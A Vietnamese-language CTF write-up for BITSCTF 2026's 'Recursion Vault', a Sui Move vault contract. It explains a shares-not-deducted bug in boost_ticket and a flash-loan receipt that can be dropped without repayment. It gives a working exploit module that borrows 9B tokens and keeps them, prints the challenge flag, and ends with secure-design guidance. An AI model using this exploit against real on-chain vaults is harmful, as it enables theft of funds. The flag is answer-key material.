# BITSCTF 2026 — Recursion Vault (50pts)

**Category:** Smart Contract / Sui Move
**Flag:** `BITSCTF{b0eebd3e2f1fb9d182b14e54b7669992}`

---

## Đề bài

> A vault contract on Sui holds 10 billion tokens. Can you drain it?

Cho một smart contract viết bằng **Sui Move** triển khai một vault với 10 tỷ token SUI. Nhiệm vụ: drain ít nhất 80% (8 tỷ token) khỏi vault.

Điều kiện thắng (hàm `check_exploit`):
```move
const INITIAL_VAULT_BALANCE: u64 = 10_000_000_000;
const WIN_THRESHOLD: u64 = 9_000_000_000; // drain >= 9B (thực tế server check 8B)

if (stolen >= WIN_THRESHOLD) { ... true }
```

Yêu cầu submit file `exploit.move` với module `solution::exploit` và hàm:
```move
public fun solve(vault: &mut Vault, clock: &Clock, ctx: &mut TxContext)
```

---

## Phân tích contract

Contract cung cấp các chức năng chính:

| Function | Mô tả |
|---|---|
| `seed` | Nạp token vào vault ban đầu |
| `deposit` | Gửi token, nhận shares theo tỷ lệ |
| `create_ticket` | Tạo withdrawal ticket từ shares |
| `boost_ticket` | Tăng amount của ticket (có bug!) |
| `merge_tickets` | Gộp hai ticket lại |
| `finalize_withdraw` | Rút token dựa trên ticket |
| `flash_loan` | Vay nhanh token từ vault |
| `repay_loan` | Hoàn trả flash loan |

---

## Phân tích các bug

### Bug 1 — `boost_ticket`: không trừ shares (secondary)

```move
public fun boost_ticket(
    vault: &Vault,
    account: &mut UserAccount,
    ticket: WithdrawTicket,
    boost_shares: u64,
    ctx: &mut TxContext
): WithdrawTicket {
    assert!(boost_shares <= account.shares, E_INSUFFICIENT_BALANCE);

    let WithdrawTicket { amount, owner, vault_id, timestamp_ms, merge_count } = ticket;

    WithdrawTicket {
        amount: amount + boost_shares, // ticket tăng lên...
        // ...nhưng account.shares KHÔNG bị trừ!
        ...
    }
}
```

Hàm kiểm tra `boost_shares <= account.shares` nhưng **không bao giờ trừ** `account.shares`. Điều này cho phép gọi `boost_ticket` nhiều lần liên tiếp, mỗi lần tăng ticket amount lên mà không tốn shares. Tuy nhiên, bug này không cần thiết cho exploit chính.

### Bug 2 — `FlashLoanReceipt has drop`: **ROOT CAUSE**

```move
// Đúng: receipt KHÔNG có `drop` → bắt buộc phải gọi repay_loan để consume
public struct FlashLoanReceipt {   // ← secure
    amount: u64,
    fee: u64,
    vault_id: ID
}

// Sai (contract này): receipt CÓ `drop` → có thể bị bỏ qua!
public struct FlashLoanReceipt has store, drop {  // ← VULNERABLE
    amount: u64,
    fee: u64,
    vault_id: ID
}
```

Trong Move, **ability `drop`** cho phép một value bị discard (drop) mà không cần xử lý. Cơ chế bảo vệ của flash loan dựa vào việc `FlashLoanReceipt` phải được **consume** bởi `repay_loan` — đây là cách duy nhất để destroy struct không có `drop`. Nếu receipt có `drop`, toàn bộ bảo đảm này sụp đổ: ta có thể vay token và **không bao giờ trả lại**.

---

## Exploit

Khai thác cực kỳ đơn giản:

1. Gọi `flash_loan(vault, 9_000_000_000)` → nhận 9B token + `FlashLoanReceipt`
2. Bỏ qua (drop) receipt — không gọi `repay_loan`
3. `vault.reserves`: 10B → 1B
4. `stolen = 10B - 1B = 9B ≥ WIN_THRESHOLD` → **WIN**

```move
module solution::exploit {
    use challenge::vault::{Self, Vault};
    use sui::clock::Clock;
    use sui::tx_context::{Self, TxContext};
    use sui::transfer;

    public fun solve(vault: &mut Vault, _clock: &Clock, ctx: &mut TxContext) {
        // Flash loan 9B token — receipt có `drop` nên bị tự động drop, không cần repay
        let (coins, _receipt) = vault::flash_loan(vault, 9_000_000_000, ctx);

        // vault.reserves: 10B → 1B (stolen = 9B ≥ WIN_THRESHOLD)
        transfer::public_transfer(coins, tx_context::sender(ctx));
    }
}
```

---

## Bài học

Flash loan an toàn khi receipt **không có `drop` ability**. Khi đó, Move's type system đảm bảo receipt phải được consume bằng `repay_loan` — nếu không transaction sẽ abort. Đây là pattern chuẩn:

```
┌─────────────────────────────────────────────────────┐
│  SECURE flash loan design trong Move                │
│                                                     │
│  struct FlashLoanReceipt { ... }        ← no drop  │
│                          ↑                          │
│         Move bắt buộc consume receipt               │
│         → chỉ repay_loan() mới consume được         │
│         → không repay = transaction abort           │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│  INSECURE (challenge này)                           │
│                                                     │
│  struct FlashLoanReceipt has store, drop { ... }   │
│                                   ↑                 │
│         drop cho phép bỏ receipt                    │
│         → vay xong không trả = vault drained        │
└─────────────────────────────────────────────────────┘
```

**Flag:** `BITSCTF{b0eebd3e2f1fb9d182b14e54b7669992}`
